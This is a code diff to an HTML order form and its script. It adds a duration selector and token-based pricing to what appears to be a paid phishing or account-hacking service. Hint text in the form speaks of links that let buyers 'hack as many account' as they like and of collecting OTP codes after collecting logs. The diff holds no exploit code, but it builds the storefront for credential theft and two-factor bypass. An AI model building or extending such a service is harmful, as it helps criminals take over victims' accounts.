@@ -125,6 +125,25 @@
         </small>
       </div>
       <div class="mb-3">
+        <label>Duration</label>
+        <select
+          class="form-select form-control text-white"
+          required
+          name="duration"
+          id="duration"
+        >
+          <option value="1" class="text-white">1 Week</option>
+          <option value="2" class="text-white">2 Weeks</option>
+          <option value="3" class="text-white">3 Weeks</option>
+          <option value="4" class="text-white">1 Month</option>
+          <option value="8" class="text-white">2 Months</option>
+          <option value="12" class="text-white">3 Months</option>
+        </select>
+        <small class="text-white"
+          >Yes for the link to collect OTP after collecting logs
+        </small>
+      </div>
+      <div class="mb-3">
         <label for="">Price(in tokens)</label>
         <input
           type="text"
@@ -133,12 +152,10 @@
           class="form-control text-white bg-dark"
           required
           readonly
-          value="Price: 1 Token"
+          id="price"
+          value="1 token(s)"
         />
-        <small class="text-white"
-          >Link lasts for 7 days, you can hack as many account within this
-          period.
-        </small>
+      </div>
       </div>
       <div class="ml-1 row">
         <button
@@ -179,8 +196,15 @@
 <script>
   const submitBtn = document.getElementById("submit");
   const submitBtn2 = document.getElementById("submit2");
+  const duration = document.getElementById("duration");
+  const price = document.getElementById("price");
+
   const handleSubmit = (e) => {
     submitBtn.style.display = "none";
     submitBtn2.style.display = "block";
   };
+
+  duration.addEventListener("change", (e) => {
+    price.value = duration.value + " token(s)";
+  });
 </script>
